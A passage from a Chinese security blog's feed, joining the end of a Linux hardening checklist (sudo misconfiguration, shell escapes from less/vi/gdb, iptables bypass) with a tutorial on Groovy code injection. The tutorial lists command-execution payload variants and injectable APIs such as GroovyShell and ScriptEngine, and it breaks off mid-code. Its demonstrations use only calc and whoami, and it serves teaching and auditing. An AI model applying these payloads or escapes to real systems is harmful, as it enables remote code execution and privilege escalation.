href="#0x04-用户管理" class="headerlink" title="0x04 用户管理"></a>0x04 用户管理</h2><h3 id="用户口令安全"><a href="#用户口令安全" class="headerlink" title="用户口令安全"></a>用户口令安全</h3><p>建议系统及相关组件服务的用户口令至少满足如下要求：</p><ul><li>口令长度&gt;=6个字符；</li><li>口令必须至少包含一个大写字母、小写字母和数字；</li><li>口令不能是连续的数字或同样的字母；</li><li>口令不能和账号明显关联；</li></ul><p>排查方法：</p><ol><li>查看系统的密码复杂度设置；</li><li>修改用户密码，检测是否校验旧密码，是否对新密码进行复杂度校验；</li></ol><h3 id="普通用户具有过多权限"><a href="#普通用户具有过多权限" class="headerlink" title="普通用户具有过多权限"></a>普通用户具有过多权限</h3><p>普通用户具备过多权限会引起越权问题，如在管理群组中uid为0等。</p><p>排查方法：</p><ol><li>查看系统/etc/passwd文件中的用户定义，是否存在多个uid为0的用户；</li><li>查看/etc/group文件，root组中是否包含多余用户；</li></ol><h3 id="sudo配置错误导致普通用户可提权执行任意命令"><a href="#sudo配置错误导致普通用户可提权执行任意命令" class="headerlink" title="sudo配置错误导致普通用户可提权执行任意命令"></a>sudo配置错误导致普通用户可提权执行任意命令</h3><p>sudo用于以另一用户的身份执行指定的命令，可执行的命令在sudoer配置文件中指定。由于配置疏忽，提供了一些通用命令，攻击者可以利用这些通用命令进行组合，越权更改系统配置文件。另一个错误点为指定的命令是一个脚本，而普通用户具备该脚本的权限，从而执行任意命令。</p><p>通过查看sudo配置文件是否包含targetpw来排查：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep targetpw /etc/sudoers</span><br></pre></td></tr></table></figure><p>如果无输出，或者输出的行以<code>#</code>开头，则表示启用了sudo。接着执行visudo命令，查看其中的命令列表是否存在<code>cp</code>、<code>chmod</code>等通用命令。</p><p>对于命令列表中的脚本，进一步排查脚本的属主和读写权限，要求属主是root，并且group和others无写权限。</p><h2 id="0x05-命令逃逸"><a href="#0x05-命令逃逸" class="headerlink" title="0x05 命令逃逸"></a>0x05 命令逃逸</h2><h3 id="shell逃逸"><a href="#shell逃逸" class="headerlink" title="shell逃逸"></a>shell逃逸</h3><p>如果在应用了具备执行外部shell命令的工具，存在通过执行外部命令逃逸处应用的风险。</p><h4 id="more命令逃逸"><a href="#more命令逃逸" class="headerlink" title="more命令逃逸"></a>more命令逃逸</h4><p><code>!whoami</code>能逃逸到shell执行whoami命令。</p><h4 id="less命令逃逸"><a href="#less命令逃逸" class="headerlink" title="less命令逃逸"></a>less命令逃逸</h4><p><code>!whoami</code>能逃逸到shell执行whoami命令。</p><h4 id="vi-vim命令逃逸"><a href="#vi-vim命令逃逸" class="headerlink" title="vi/vim命令逃逸"></a>vi/vim命令逃逸</h4><p><code>!whoami</code>能逃逸到shell执行whoami命令。</p><h4 id="gdb命令逃逸"><a href="#gdb命令逃逸" class="headerlink" title="gdb命令逃逸"></a>gdb命令逃逸</h4><p><code>shell whoami</code>能逃逸到shell执行whoami命令。</p><h3 id="自定义shell界面存在逃逸"><a href="#自定义shell界面存在逃逸" class="headerlink" title="自定义shell界面存在逃逸"></a>自定义shell界面存在逃逸</h3><p>原理：有些自定义的产品在对用户展示信息时，有可能会调用外部的less、more等命令来实现的，若是这种场景则可能存在命令逃逸的风险。</p><p>排查方法：分析自定义的二进制文件所调用的system、exec、popen等函数的调用点，查看是否有执行具备外部逃逸命令行为的调用。</p><h2 id="0x06-本地提权"><a href="#0x06-本地提权" class="headerlink" title="0x06 本地提权"></a>0x06 本地提权</h2><p>当使用root用户访问低权限用户的目录时，低权限用户可以更改此目录为符号链接，指向自己没有权限操作的位置，达到改写任意文件的目的。</p><p>除此之外，当root用户运行属主为低权限用户的脚本或者低权限用户拥有写权限的脚本时，同样存在本地提权问题。</p><p>具体可参考：<a href="https://www.halfdog.net/Security/2015/NtpCronjobUserNtpToRootPrivilegeEscalation/" target="_blank" rel="noopener">https://www.halfdog.net/Security/2015/NtpCronjobUserNtpToRootPrivilegeEscalation/</a></p><h2 id="0x07-sysctl"><a href="#0x07-sysctl" class="headerlink" title="0x07 sysctl"></a>0x07 sysctl</h2><p>sysctl命令用于运行时配置内核参数，这些参数位于/proc/sys目录下。sysctl配置与显示在/proc/sys目录中的内核参数中。可以用sysctl来设置联网功能，如IP转发、源路由检查等。用户只需要编辑/etc/sysctl.conf文件即可手动或自动执行由sysctl控制的功能。</p><p>如下三种配置存在安全问题：</p><ul><li>设置net.ipv4.ip_forward=1，使得Linux不同网卡间报文可以转发，导致三面不隔离；</li><li>设置net.ipv4.conf.all.accept_redirects = 1，使得Linux接收ICMP redirect报文，会被中间人攻击；</li><li>没有设置net.ipv4.tcp_syncookies为1，不能防御TCP SYN Flood攻击；</li></ul><h2 id="0x08-系统配置"><a href="#0x08-系统配置" class="headerlink" title="0x08 系统配置"></a>0x08 系统配置</h2><h3 id="系统未做资源控制，普通用户消耗过多资源导致DoS"><a href="#系统未做资源控制，普通用户消耗过多资源导致DoS" class="headerlink" title="系统未做资源控制，普通用户消耗过多资源导致DoS"></a>系统未做资源控制，普通用户消耗过多资源导致DoS</h3><p>原理：系统资源会因为外部操作而明显消耗，导致DoS。这些资源包括文件句柄、内存、CPU、最大进程数、登录会话数等。</p><p>排查方法：</p><ol><li>分析外部接口，是否存在可被外部触发大量的资源消耗操作；</li><li>使用程序消耗大量系统资源，查看系统是否存在资源过载保护机制，正常业务是否明显受到影响，如用户无法登录、无法运行新进程等；</li></ol><h3 id="iptables规则存在被绕过的错误配置"><a href="#iptables规则存在被绕过的错误配置" class="headerlink" title="iptables规则存在被绕过的错误配置"></a>iptables规则存在被绕过的错误配置</h3><p>由于iptables规则设计不完善，可导致被绕过。</p><p>比如，一个虚拟机br网桥安全组规则片段如下：</p><p>规则1，允许UDP报文通过，源端口是68，目的端口是67：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-A neutron-openvswi-ofa960951-9 -p udp -m udp --sport 68 --dport 67 -j RETURN</span><br></pre></td></tr></table></figure><p>规则2，目的IP是100.64.0.0/10的全部丢弃报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-A neutron-openvswi-relay-cidr -d 100.64.0.0/10 -j DROP</span><br></pre></td></tr></table></figure><p>规则3，检测目的MAC与IP是否绑定，没有绑定则直接丢弃报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-A neutron-openvswi-s0bff551f-2 -s 192.168.0.15/32 -m mac --mac-source FA:16:3E:71:F1:DD -j RETURN</span><br><span class="line">-a neutron-openvswi-s0bff551f-2 -j DROP</span><br></pre></td></tr></table></figure><p>上述安全组规则设计存在如下缺陷：由于规则2比规则1优先级低，恶意用户构造特殊报文会绕过目的IP为100.64.0.0某些协议的报文穿越到其他租户的VPC中，对不属于自己的虚拟机进行流量攻击，破坏VPC隔离性。</p><h3 id="系统对外的文件共享（nfs、samba）配置不当"><a href="#系统对外的文件共享（nfs、samba）配置不当" class="headerlink" title="系统对外的文件共享（nfs、samba）配置不当"></a>系统对外的文件共享（nfs、samba）配置不当</h3><p>执行<code>exportfs -av</code>命令，查看系统开启了哪些nfs共享并逐个确认。</p><p>查看/etc/samba/smb.conf，查看系统开启了哪些共享并逐个确认。</p><h3 id="建议禁止用户利用ssh做端口转发"><a href="#建议禁止用户利用ssh做端口转发" class="headerlink" title="建议禁止用户利用ssh做端口转发"></a>建议禁止用户利用ssh做端口转发</h3><p>ssh的端口转发功能会破坏网络隔离性，非必须的情况下建议默认禁止。</p><p>排查方法：查看/etc/ssh/ssh_config配置文件，确认端口转发功能是否已默认禁止，选项为<code>AllowTcpForwarding</code>。</p><h3 id="口令保存在-etc-passwd中"><a href="#口令保存在-etc-passwd中" class="headerlink" title="口令保存在/etc/passwd中"></a>口令保存在/etc/passwd中</h3><p>用户口令密文保存在/etc/passwd文件中，而不是/etc/shadow文件中。</p><p>/etc/passwd是全局可读的文件，若用户口令密文直接保存在该文件中将会导致用户密码可被工具暴力破解。</p><p>排查方法：直接查看/etc/passwd的内容是否存在用户口令密文。</p><h2 id="0x09-日志审计"><a href="#0x09-日志审计" class="headerlink" title="0x09 日志审计"></a>0x09 日志审计</h2><h3 id="日志文件可被普通用户修改"><a href="#日志文件可被普通用户修改" class="headerlink" title="日志文件可被普通用户修改"></a>日志文件可被普通用户修改</h3><p>日志文件用于审计，需要防止被普通用户修改。</p><p>排查方法：查看所有系统日志文件的访问权限，避免出现可被普通用户进行修改的权限。</p><h3 id="日志目录未处于独立分区，日志过多会导致占满整个磁盘"><a href="#日志目录未处于独立分区，日志过多会导致占满整个磁盘" class="headerlink" title="日志目录未处于独立分区，日志过多会导致占满整个磁盘"></a>日志目录未处于独立分区，日志过多会导致占满整个磁盘</h3><p>如题。</p><h3 id="系统是否监听UDP-514端口，能接收网络上发来的日志信息"><a href="#系统是否监听UDP-514端口，能接收网络上发来的日志信息" class="headerlink" title="系统是否监听UDP 514端口，能接收网络上发来的日志信息"></a>系统是否监听UDP 514端口，能接收网络上发来的日志信息</h3><p>对于非嵌入式Linux，开启了syslog服务后，会监听UDP 514端口，此时网络所发过来的日志都会被syslog记录，若日志量非常大时，会极大地消耗磁盘空间。</p><p>排查方法：<code>netstat -an | grep 514</code></p><p>如果有监听，则查看syslog日志是否保存在独立分区中，或者日志是否有做轮转。</p><h3 id="日志是否记录敏感信息"><a href="#日志是否记录敏感信息" class="headerlink" title="日志是否记录敏感信息"></a>日志是否记录敏感信息</h3><p>查看系统日志，使用关键字查找日志文件，是否有session、密码、token、地址、号码等用户敏感信息。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Linux" scheme="https://www.mi1k7ea.com/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://www.mi1k7ea.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>浅析Groovy代码注入漏洞</title>
    <link href="https://www.mi1k7ea.com/2020/03/24/%E6%B5%85%E6%9E%90Groovy%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2020/03/24/浅析Groovy代码注入漏洞/</id>
    <published>2020-03-24T13:27:17.000Z</published>
    <updated>2020-03-26T13:52:08.925Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="Groovy简介"><a href="#Groovy简介" class="headerlink" title="Groovy简介"></a>Groovy简介</h3><p>Groovy是一种基于JVM（Java虚拟机）的敏捷开发语言，它结合了Python、Ruby和Smalltalk的许多强大的特性，Groovy代码能够与Java代码很好地结合，也能用于扩展现有代码。由于其运行在JVM上的特性，Groovy也可以使用其他非Java语言编写的库。</p><p>Groovy是用于Java虚拟机的一种敏捷的动态语言，它是一种成熟的面向对象编程语言，既可以用于面向对象编程，又可以用作纯粹的脚本语言。使用该种语言不必编写过多的代码，同时又具有闭包和动态语言中的其他特性。</p><p>Groovy是JVM的一个替代语言（替代是指可以用Groovy在Java平台上进行Java编程），使用方式基本与使用Java代码的方式相同，该语言特别适合与Spring的动态语言支持一起使用，设计时充分考虑了Java集成，这使Groovy与Java代码的互操作很容易。（注意：不是指Groovy替代Java，而是指Groovy和Java很好的结合编程。）</p><p>Groovy有以下特点：</p><ul><li>同时支持静态和动态类型；</li><li>支持运算符重载；</li><li>本地语法列表和关联数组；</li><li>对正则表达式的本地支持；</li><li>各种标记语言，如XML和HTML原生支持；</li><li>Groovy对于Java开发人员来说很简单，因为Java和Groovy的语法非常相似；</li><li>可以使用现有的Java库；</li><li>Groovy扩展了java.lang.Object；</li></ul><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><p>参考：<a href="https://www.w3cschool.cn/groovy/" target="_blank" rel="noopener">https://www.w3cschool.cn/groovy/</a></p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载Groovy：<a href="http://groovy-lang.org/download.html" target="_blank" rel="noopener">http://groovy-lang.org/download.html</a></p><p>解压之后，使用IDEA新建Groovy项目时选择解压的Groovy目录即可。然后点击src-&gt;new&gt;groovy class，即可新建一个groovy文件，内容如下：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> &#123;</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> main(args)&#123;</span><br><span class="line">        println <span class="string">"Hello World!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5种运行方式"><a href="#5种运行方式" class="headerlink" title="5种运行方式"></a>5种运行方式</h3><h4 id="groovyConsole图形交互控制台"><a href="#groovyConsole图形交互控制台" class="headerlink" title="groovyConsole图形交互控制台"></a>groovyConsole图形交互控制台</h4><p>在终端下输入<code>groovyConsole</code>启动图形交互控制台，在上面可以直接编写代码执行：</p><p><img src="/2020/03/24/浅析Groovy代码注入漏洞/1.png" alt=""></p><h4 id="groovysh-shell命令交互"><a href="#groovysh-shell命令交互" class="headerlink" title="groovysh shell命令交互"></a>groovysh shell命令交互</h4><p>在终端下输入<code>groovysh</code>启动一个shell命令行来执行Groovy代码的交互：</p><p><img src="/2020/03/24/浅析Groovy代码注入漏洞/2.png" alt=""></p><h4 id="用命令行执行Groovy脚本"><a href="#用命令行执行Groovy脚本" class="headerlink" title="用命令行执行Groovy脚本"></a>用命令行执行Groovy脚本</h4><p>在GROOVY_HOME\bin里有个叫“groovy”或“groovy.bat”的脚本文件，可以类似<code>python test.py</code>这种方式来执行Groovy脚本。</p><p>1.groovy：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">println(<span class="string">"mi1k7ea"</span>)</span><br></pre></td></tr></table></figure><p>在Windows运行<code>groovy.bat 1.groovy</code>即可执行该Groovy脚本：</p><p><img src="/2020/03/24/浅析Groovy代码注入漏洞/3.png" alt=""></p><h4 id="通过IDE运行Groovy脚本"><a href="#通过IDE运行Groovy脚本" class="headerlink" title="通过IDE运行Groovy脚本"></a>通过IDE运行Groovy脚本</h4><p>有一个叫GroovyShell的类含有main(String[])方法可以运行任何Groovy脚本。</p><p>在前面的IDEA中可以直接运行Groovy脚本：</p><p><img src="/2020/03/24/浅析Groovy代码注入漏洞/4.png" alt=""></p><p>当然，也可以在Java环境中通过groovy-all.jar中的groovy.lang.GroovyShell类来运行Groovy脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp groovy-all-2.4.12.jar groovy.lang.GroovyShell 1.groovy</span><br></pre></td></tr></table></figure><p><img src="/2020/03/24/浅析Groovy代码注入漏洞/5.png" alt=""></p><h4 id="用Groovy创建Unix脚本"><a href="#用Groovy创建Unix脚本" class="headerlink" title="用Groovy创建Unix脚本"></a>用Groovy创建Unix脚本</h4><p>你可以用Groovy编写Unix脚本并且像Unix脚本一样直接从命令行运行它.倘若你安装的是二进制分发包并且设置好环境变量,那么下面的代码将会很好的工作。</p><p>编写一个类似如下的脚本文件，保存为：HelloGroovy</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env groovy</span></span><br><span class="line">println(<span class="string">"this is groovy script"</span>)</span><br><span class="line">println(<span class="string">"Hi,"</span>+args[<span class="number">0</span>]+<span class="string">" welcome to Groovy"</span>)</span><br></pre></td></tr></table></figure><p>然后在命令行下执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ chmod +x HelloGroovy</span><br><span class="line">$ ./HelloGroovy micmiu.com</span><br><span class="line">this is groovy script</span><br><span class="line">Hi,micmiu.com welcome to Groovy</span><br></pre></td></tr></table></figure><h2 id="0x02-Groovy代码注入漏洞"><a href="#0x02-Groovy代码注入漏洞" class="headerlink" title="0x02 Groovy代码注入漏洞"></a>0x02 Groovy代码注入漏洞</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>我们知道，Groovy是一种强大的编程语言，其强大的功能包括了危险的命令执行等调用。</p><p>在目标服务中，如果外部可控输入Groovy代码或者外部可上传一个恶意的Groovy脚本，且程序并未对输入的Groovy代码进行有效的过滤，那么会导致恶意的Groovy代码注入，从而RCE。</p><p>如下代码简单地执行命令：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> &#123;</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> main(args)&#123;</span><br><span class="line">        <span class="keyword">def</span> cmd = <span class="string">"calc"</span>;</span><br><span class="line">        println <span class="string">"$&#123;cmd.execute()&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段Groovy代码被执行就会弹计算器：</p><p><img src="/2020/03/24/浅析Groovy代码注入漏洞/6.png" alt=""></p><h3 id="几种PoC变通形式"><a href="#几种PoC变通形式" class="headerlink" title="几种PoC变通形式"></a>几种PoC变通形式</h3><p>Groovy代码注入实现命令执行有以下几种变通的形式：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接命令执行</span></span><br><span class="line">Runtime.getRuntime().exec(<span class="string">"calc"</span>)</span><br><span class="line"><span class="string">"calc"</span>.execute()</span><br><span class="line"><span class="string">'calc'</span>.execute()</span><br><span class="line"><span class="string">"$&#123;"</span>calc<span class="string">".execute()&#125;"</span></span><br><span class="line"><span class="string">"$&#123;'calc'.execute()&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 回显型命令执行</span></span><br><span class="line">println <span class="string">"whoami"</span>.execute().text</span><br><span class="line">println <span class="string">'whoami'</span>.execute().text</span><br><span class="line">println <span class="string">"$&#123;"</span>whoami<span class="string">".execute().text&#125;"</span></span><br><span class="line">println <span class="string">"$&#123;'whoami'.execute().text&#125;"</span></span><br><span class="line"><span class="keyword">def</span> cmd = <span class="string">"whoami"</span>;</span><br><span class="line">println <span class="string">"$&#123;cmd.execute().text&#125;"</span>;</span><br></pre></td></tr></table></figure><h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><p>在下面一些场景中，会触发Groovy代码注入漏洞。</p><h4 id="GroovyShell"><a href="#GroovyShell" class="headerlink" title="GroovyShell"></a>GroovyShell</h4><p>GroovyShell允许在Java类中（甚至Groovy类）解析任意Groovy表达式的值。</p><p>GroovyShellExample.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> groovy.lang.GroovyShell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GroovyShellExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> </span>&#123;</span><br><span class="line">        GroovyShell groovyShell = <span class="keyword">new</span> GroovyShell();</span><br><span class="line">        groovyShell.evaluate(<span class="string">"\"calc\".execute()"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接运行即可弹计算器：</p><p><img src="/2020/03/24/浅析Groovy代码注入漏洞/7.png" alt=""></p><p>或者换成运行Groovy脚本的方式也是也一样的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> groovy.lang.GroovyShell;</span><br><span class="line"><span class="keyword">import</span> groovy.lang.Script;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GroovyShellExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        GroovyShell groovyShell = <span class="keyword">new</span> GroovyShell();</span><br><span class="line">        Script script = groovyShell.parse(<span class="keyword">new</span> File(<span class="string">"src/test.groovy"</span>));</span><br><span class="line">        script.run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.groovy：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">println <span class="string">"whoami"</span>.execute().text</span><br></pre></td></tr></table></figure><p>此外，可使用Binding对象输入参数给表达式，并最终通过GroovyShell返回Groovy表达式的计算结果。</p><h4 id="GroovyScriptEngine"><a href="#GroovyScriptEngine" class="headerlink" title="GroovyScriptEngine"></a>GroovyScriptEngine</h4><p>GroovyScriptEngine可从指定的位置（文件系统、URL、数据库等等）加载Groovy脚本，并且随着脚本变化而重新加载它们。如同GroovyShell一样，GroovyScriptEngine也允许传入参数值，并能返回脚本的计算值。</p><p>GroovyScriptEngineExample.java，直接运行即加载Groovy脚本文件实现命令执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> groovy.lang.Binding;</span><br><span class="line"><span class="keyword">import</span> groovy.util.GroovyScriptEngine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GroovyScriptEngineExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        GroovyScriptEngine groovyScriptEngine = <span class="keyword">new</span> GroovyScriptEngine(<span class="string">""</span>);</span><br><span class="line">        groovyScriptEngine.run(<span class="string">"src/test.groovy"</span>,<span class="keyword">new</span> Binding());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.groovy脚本文件如之前。</p><h4 id="GroovyClassLoader"><a href="#GroovyClassLoader" class="headerlink" title="GroovyClassLoader"></a>GroovyClassLoader</h4><p>GroovyClassLoader是一个定制的类装载器，负责解释加载Java类中用到的Groovy类。</p><p>GroovyClassLoaderExample.java，直接运行即加载Groovy脚本文件实现命令执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> groovy.lang.GroovyClassLoader;</span><br><span class="line"><span class="keyword">import</span> groovy.lang.GroovyObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GroovyClassLoaderExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        GroovyClassLoader groovyClassLoader = <span class="keyword">new</span> GroovyClassLoader();</span><br><span class="line">        Class loadClass = groovyClassLoader.parseClass(<span class="keyword">new</span> File(<span class="string">"src/test.groovy"</span>));</span><br><span class="line">        GroovyObject groovyObject = (GroovyObject) loadClass.newInstance();</span><br><span class="line">        groovyObject.invokeMethod(<span class="string">"main"</span>,<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.groovy脚本文件如之前。</p><h4 id="ScriptEngine"><a href="#ScriptEngine" class="headerlink" title="ScriptEngine"></a>ScriptEngine</h4><p>ScriptEngine脚本引擎是被设计为用于数据交换和脚本执行的。</p><ul><li>数据交换：表现在调度引擎的时候，允许将数据输入/输出引擎，至于引擎内的数据持有的具体方式有两种：普通的键值对和Bindings（interface Bindings extends Map&lt;String,Object&gt;）；</li><li>脚本执行：脚本引擎执行表现为调用eval()；</li></ul><p>ScriptEngineManager类是一个脚本引擎的管理类，用来创建脚本引擎，大概的方式就是在类加载的时候通过SPI的方式，扫描ClassPath中已经包含实现的所有ScriptEngineFactory，载入后用来负责生成具体的ScriptEngine。</p><p>在ScriptEngine中，支持名为“groovy”的引擎，可用来执行Groovy代码。这点和在SpEL表达式注入漏洞中讲到的同样是利用ScriptEngine支持JS引擎从而实现绕过达到RCE是一样的。</p><p>ScriptEngineExample.java，直接运行即命令执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ScriptEngineExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ScriptEngine groovyEngine = <span class="keyword">new</span> ScriptEngineManager().getEngineByName(<span class="string">"groovy"</span>);</span><br><span class="line">        groovyEngine.eval(<span class="string">"\"calc\".execute()"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行Groovy脚本，需要实现读取文件内容的接口而不能直接传入File类对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineManager;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ScriptEngineExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ScriptEngine groovyEngine = <span class="keyword">new</span> ScriptEngineManager().getEngineByName(<span class="string">"groovy"</span>);</span><br><span class="line">        String code = readfile(<span class="string">"src/test.groovy"</span>);</span><br><span class="line">        groovyEngine.eval(code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readfile</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(filename));</span><br><span class="line">        String string = <span class="string">""</span>;</span><br><span class="line">        String str;</span><br><span class="line">        <span class="keyword">while</span> ((str = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            string = string + str;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> string;</span><br><span class="line">    &#125;</span><br><span 